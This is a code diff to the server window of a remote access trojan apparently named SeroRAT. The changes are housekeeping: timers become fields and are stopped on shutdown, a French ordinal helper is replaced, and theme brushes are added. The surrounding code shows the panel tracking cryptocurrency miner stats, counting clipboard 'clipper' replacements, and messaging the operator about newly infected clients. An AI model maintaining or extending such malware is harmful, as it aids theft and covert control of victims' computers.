@@ -25,6 +25,8 @@ public partial class ServerWindow : ThemedWindow
     private DateTime _serverStartedAt;
     private readonly DispatcherTimer _dashTimer;
     private readonly DispatcherTimer _uptimeTimer;
+    private readonly DispatcherTimer _idleTimer;
+    private readonly DispatcherTimer _signalTimer;
     private readonly System.Collections.ObjectModel.ObservableCollection<Data.AutoTaskEntry> _autoTasks = new();
     private Net.SeroDiscordRPC? _discordRpc;
     private int MinerStatsPort => int.TryParse(TxtMnrStatsPort?.Text, out int p) && p > 0 ? p : 8081;
@@ -251,8 +253,8 @@ public partial class ServerWindow : ThemedWindow
         // Only increment when the stub hasn't sent HardwareStats recently (>20s gap):
         // the stub reports real OS idle time every ~15s, so adding on top would cause
         // double-counting and push clients into AFK earlier than their actual idle time.
-        var idleTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
-        idleTimer.Tick += (_, _) =>
+        _idleTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
+        _idleTimer.Tick += (_, _) =>
         {
             var srv = _server;
             if (srv == null) return;
@@ -264,12 +266,12 @@ public partial class ServerWindow : ThemedWindow
                         c.IdleSeconds += 5;
             });
         };
-        idleTimer.Start();
+        _idleTimer.Start();
 
         // Connection health signal indicator — updates every 5 seconds
-        var signalTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
-        signalTimer.Tick += (_, _) => UpdateSignalHealth();
-        signalTimer.Start();
+        _signalTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
+        _signalTimer.Tick += (_, _) => UpdateSignalHealth();
+        _signalTimer.Start();
 
         Loaded += (_, _) =>
         {
@@ -312,7 +314,6 @@ public partial class ServerWindow : ThemedWindow
             LoadColumnVisibility();
             RestoreGridColumnWidths();
             SetupGridColumnPersistence();
-            PopulateColumnVisibilityMenu();
             UpdateSettingsCheckboxStates();
 
             // Initialise diagnostic logger (enabled by default)
@@ -554,6 +555,7 @@ public partial class ServerWindow : ThemedWindow
         ClipperCountTxt.Text = clipSavedText;
         System.Threading.Tasks.Task.Delay(1500).ContinueWith(_ =>
             Dispatcher.BeginInvoke(() => {
+                if (!IsLoaded) return;
                 if (ClipperCountTxt.Text == clipSavedText)
                     ClipperCountTxt.Text = _clipperCount > 0 ? string.Format(Lang.Get("CLIP_REPLACEMENTS"), _clipperCount) : "";
             }));
@@ -849,7 +851,7 @@ public partial class ServerWindow : ThemedWindow
             var paris   = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, parisTz)
                               .ToString("yyyy-MM-dd HH:mm") + " (Paris)";
 
-            var clientLabel = TgFrenchOrdinal(count);
+            var clientLabel = $"{TgOrdinal(count)} client";
             var msg =
                 $"{clientLabel} - SeroRAT\n\n" +
                 $"ID: {c.Id}\n" +
@@ -890,23 +892,6 @@ public partial class ServerWindow : ThemedWindow
         return $"{n}{suffix}";
     }
 
-    private static string TgFrenchOrdinal(int n)
-    {
-        return n switch
-        {
-            1 => "1er client",
-            2 => "2ème client",
-            3 => "3ème client",
-            4 => "4ème client",
-            5 => "5ème client",
-            6 => "6ème client",
-            7 => "7ème client",
-            8 => "8ème client",
-            9 => "9ème client",
-            10 => "10ème client",
-            _ => $"{n}ème client"
-        };
-    }
 
     // ── Server Control ──────────────────────────────
 
@@ -948,6 +933,10 @@ public partial class ServerWindow : ThemedWindow
         _featureWindows.Clear();
         _tikTokWindow?.Close();   _tikTokWindow = null;
         _server?.Stop();
+        _idleTimer.Stop();
+        _signalTimer.Stop();
+        _dashTimer.Stop();
+        _uptimeTimer.Stop();
         Application.Current.Shutdown();
     }
 
@@ -1260,7 +1249,6 @@ public partial class ServerWindow : ThemedWindow
         var clients = _store.AllClients.Values
             .Where(r => currentPort == 0 || r.LastPort == 0 || r.LastPort == currentPort);
         var recordList = new ObservableCollection<ClientRecord>(clients);
-        GridAllClients.ItemsSource = null;
         GridAllClients.ItemsSource = recordList;
         _allClientsView = System.Windows.Data.CollectionViewSource.GetDefaultView(recordList);
         if (_allClientsView != null)
@@ -7730,6 +7718,9 @@ Read-Host 'Press Enter to close'
             "FieldLabelBrush", "BtnBgBrush", "BtnBorderBrush", "BtnHoverBgBrush", "BtnHoverBorderBrush",
             "BtnPressedBgBrush", "BtnFgBrush", "BtnPrimaryBgBrush", "CardBgBrush", "ChartBgBrush", "ProgressTrackBrush",
             "AlternatingRowBgBrush", "RowSelBgBrush", "RowSelTextBrush", "RowSelBorderBrush",
+            "RowHoverBgBrush",
+            "ColHeaderBgBrush", "ColHeaderFgBrush", "ColHeaderBorderBrush", "ColHeaderHoverBrush",
+            "FlagUnknownBrush",
             "ThemeFontFamily", "PrimaryGradient",
             "WindowOutlineBrush", "WindowOutlineThickness",
             "ContainerCornerRadius"
